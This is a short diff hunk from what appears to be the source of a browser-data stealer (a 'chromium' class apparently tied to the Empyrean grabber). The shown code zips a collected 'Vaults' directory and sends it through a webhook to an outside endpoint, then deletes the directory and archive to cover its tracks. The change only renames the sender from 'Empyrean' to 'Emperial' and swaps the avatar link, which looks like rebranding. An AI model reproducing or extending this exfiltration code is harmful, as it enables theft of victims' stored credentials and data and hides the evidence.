@@ -82,7 +82,7 @@ class chromium:
         embed = Embed(title='Vaults', description='```' +
                       '\n'.join(self.tree(Path(self.work_dir))) + '```', color=0x000000)
         webhook.send(embed=embed, file=File(self.work_dir + '.zip'),
-                     username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+                     username="Emperial", avatar_url="https://imgur.com/t/awesome/RtguoF2")
 
         shutil.rmtree(self.work_dir)
         os.remove(self.work_dir + '.zip')
